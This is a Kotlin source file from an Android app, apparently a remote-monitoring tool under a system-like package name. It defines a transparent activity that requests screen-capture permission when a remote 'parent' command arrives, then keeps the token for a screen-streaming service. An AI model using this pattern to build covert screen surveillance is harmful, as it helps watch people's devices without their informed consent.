package com.system.service.setup

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import com.system.service.monitors.ScreenStreamService

/**
 * Transparent activity that requests MediaProjection (screen capture) permission.
 * Launched by CoreService when parent sends "request_screen_permission" command.
 * Result is stored in ScreenStreamService companion object for later use.
 */
class MediaProjectionActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            @Suppress("DEPRECATION")
            startActivityForResult(mgr.createScreenCaptureIntent(), REQUEST_CODE)
        } catch (_: Exception) {
            finish()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            // Store token for ScreenStreamService to use
            ScreenStreamService.projectionResultCode = resultCode
            ScreenStreamService.projectionResultData = Intent(data)
        }
        finish()
    }

    companion object {
        private const val REQUEST_CODE = 1001
    }
}
